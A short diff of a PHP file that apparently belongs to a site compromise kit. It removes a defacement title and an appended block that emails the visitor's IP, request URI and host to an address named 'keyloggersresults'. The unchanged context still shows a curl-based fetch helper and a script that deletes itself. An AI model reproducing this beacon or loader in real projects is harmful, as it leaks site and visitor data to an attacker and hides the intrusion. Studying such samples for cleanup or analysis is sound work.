@@ -1,4 +1,3 @@
-<title>Vuln!! patch it Now!MrSpyUp!!</title>
 <?php
 function http_get($url){
 	$im = curl_init($url);
@@ -32,16 +31,4 @@ if(file_exists($check2)){
 echo "done .\n " ;
 
 @unlink(__FILE__);
-?>
-<?php
-$ip = getenv("REMOTE_ADDR");
-$ra44 = rand(1, 99999);
-$subj98 = " Bot V3 Rzlt |$ip";
-$email = "keyloggersresults@gmail.com";
-$from = "From: Result<botv3@mrspybotv3.com";
-$a45 = $_SERVER['REQUEST_URI'];
-$b75 = $_SERVER['HTTP_HOST'];
-$m22 = $ip . "";
-$msg8873 = "$a45 $b75 $m22";
-mail($email, $subj98, $msg8873, $from);
 ?>
